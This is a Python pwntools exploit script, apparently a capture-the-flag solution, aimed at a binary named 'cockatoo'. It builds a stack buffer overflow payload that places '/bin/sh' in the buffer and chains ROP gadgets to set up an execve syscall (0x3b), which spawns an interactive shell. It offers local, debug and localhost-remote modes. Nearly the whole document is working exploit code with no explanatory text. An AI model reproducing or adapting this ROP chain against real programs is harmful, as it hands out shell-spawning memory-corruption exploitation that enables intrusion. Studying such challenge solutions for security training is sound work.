from pwn import *
from icecream import ic

elf = exe = ELF("./cockatoo")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *main
# b *0x0000000000401189
b *0x0000000000401209
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

pop_rax = 0x0000000000401001
syscall_ret = 0x0000000000401a8b
test_gadget = 0x0000000000401a7a #0x0000000000401a7a: mov rdi, rsi; mov r8, r9; mov rsi, rdx; mov r9, qword ptr [rsp + 8]; mov rdx, rcx; syscall;
# add_rsp_0x18 = 0x0000000000401a66
poop_gadget = 0x0000000000401a84 #0x0000000000401a84: mov ecx, dword ptr [rsp + 8]; mov rdx, rcx; syscall; ret;


payload = b'/bin/sh\x00'
payload += b'a'*(256-8) + b'\x17'
payload += p64(test_gadget)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(poop_gadget)

payload += p64(0)*2
# payload += p64()
sl(payload)
# sl(b'a')
# sl(b'a')
io.interactive()
